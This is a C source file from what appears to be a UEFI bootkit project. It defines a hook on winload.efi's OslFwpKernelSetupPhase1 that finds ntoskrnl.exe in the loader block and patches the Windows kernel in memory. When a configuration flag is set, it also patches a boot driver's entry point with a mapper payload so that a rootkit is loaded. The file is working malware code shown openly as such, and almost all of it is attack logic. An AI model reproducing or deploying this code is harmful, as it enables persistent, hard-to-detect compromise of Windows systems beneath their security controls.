// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Hooks winload.efi!OslFwpKernelSetupPhase1
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiBootServicesTableLib.h
// Provides a service to retrieve a pointer to the EFI Boot Services Table. Only available to DXE and UEFI module types.
#include <Library/UefiBootServicesTableLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/BaseMemoryLib.h
// Provides copy memory, fill memory, zero memory, and GUID functions. The Base Memory Library provides optimized implementations for common memory-based operations. These functions should be used in place of coding your own loops to do equivalent common functions. This allows optimized library implementations to help increase performance.
#include <Library/BaseMemoryLib.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot0_Configuration/Functions/Functions00Configuration.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils01Strings.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils03Memory.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils04Headers.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils09Hooks.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils11KernelModeDriverMapper.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Functions03PatchHookWindowsKernel.h>



// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------
// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module1_BootWindows0_Hookings/Payloads/Payloads00KernelModeDriver.h>



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Hooks the OslFwpKernelSetupPhase1 function.
	@details        This function replaces the original OslFwpKernelSetupPhase1 function with a custom hook that allows for additional functionality.


	@param[in]      LoaderBlock                 A pointer to the Loader Parameter Block.


	@retval         EFI_SUCCESS                 The OslFwpKernelSetupPhase1 function was successfully hooked.
	@retval         other                       An error occurred during the hooking process.
**/
EFI_STATUS
BootWindowsHookings_HooksWinloadEfi_OslFwpKernelSetupPhase1(
	IN              PLOADER_PARAMETER_BLOCK     LoaderBlock
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello


	// ---------------------------------------------------------------------------------------------------------------------
	// Restore original function bytes that were replaced with hook
	BootWindowsHookings_UtilsMemory_CopyMemory((VOID*)Global_BootWindowsHookings_UtilsHooks_WinloadEfiOslFwpKernelSetupPhase1OriginalPointer, Global_BootWindowsHookings_UtilsHooks_WinloadEfiOslFwpKernelSetupPhase1BackupBytes, sizeof(Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplate));

    
	// ---------------------------------------------------------------------------------------------------------------------
	// Get kernel entry from loader block's LoadOrderList
	UINT8* LoadOrderListHeadAddress = (UINT8*)&LoaderBlock->LoadOrderListHead;
	CONST PKLDR_DATA_TABLE_ENTRY KernelEntry = BootWindowsHookings_UtilsMapper_FindLoadedBootDriverByName((LIST_ENTRY*)LoadOrderListHeadAddress, L"ntoskrnl.exe");

	// Failed
	if (KernelEntry == NULL)
	{
		// Call original transfering execution back to winload!OslFwpKernelSetupPhase1
		return ((t_OslFwpKernelSetupPhase1)Global_BootWindowsHookings_UtilsHooks_WinloadEfiOslFwpKernelSetupPhase1OriginalPointer)(LoaderBlock);
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Get kernel base and headers
	VOID* KernelBase = KernelEntry->DllBase;
	CONST UINT32 KernelSize = KernelEntry->SizeOfImage;
	CONST PEFI_IMAGE_NT_HEADERS NtHeaders = KernelBase != NULL && KernelSize > 0 ? BootWindowsHookings_UtilsHeaders_GetNTHeadersPEFile(KernelBase, (UINTN)KernelSize) : NULL;

	// Failed
	if (KernelBase == NULL || KernelSize == 0)
	{
		// Call original transfering execution back to winload!OslFwpKernelSetupPhase1
		return ((t_OslFwpKernelSetupPhase1)Global_BootWindowsHookings_UtilsHooks_WinloadEfiOslFwpKernelSetupPhase1OriginalPointer)(LoaderBlock);
	}
    

	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the BootkitBootMapRootkitToMemory field is TRUE

	// Compares two Null-terminated Unicode strings, and returns the difference between the first mismatched Unicode characters.
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L109
	if (StrCmp(Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemory, L"TRUE") == 0)
	{

		// Hook DriverEntry of Target Module
		CONST PKLDR_DATA_TABLE_ENTRY TargetDriverEntry = BootWindowsHookings_UtilsMapper_FindLoadedBootDriverByName((LIST_ENTRY*)LoadOrderListHeadAddress, Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemoryModule);

		if (Global_BootWindowsHookings_UtilsKernelModeDriverMapper_MappedKernelModeDriverState.AllocatedBuffer != NULL && TargetDriverEntry != NULL)
		{
			// gBS->Stall(20*1000000);
			BootWindowsHookings_UtilsMapper_PatchDriverEntryWithMapperPayload(KernelEntry, TargetDriverEntry);
		}
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Patch Windows Kernel

	EFI_STATUS Status = BootWindowsHookings_FunctionsWindowsKernel_PatchNtoskrnlExe(KernelBase, NtHeaders);

	// Failed
	if (EFI_ERROR(Status))
	{
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye


	// ---------------------------------------------------------------------------------------------------------------------
	// Call original transfering execution back to winload!OslFwpKernelSetupPhase1
	return ((t_OslFwpKernelSetupPhase1)Global_BootWindowsHookings_UtilsHooks_WinloadEfiOslFwpKernelSetupPhase1OriginalPointer)(LoaderBlock);
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
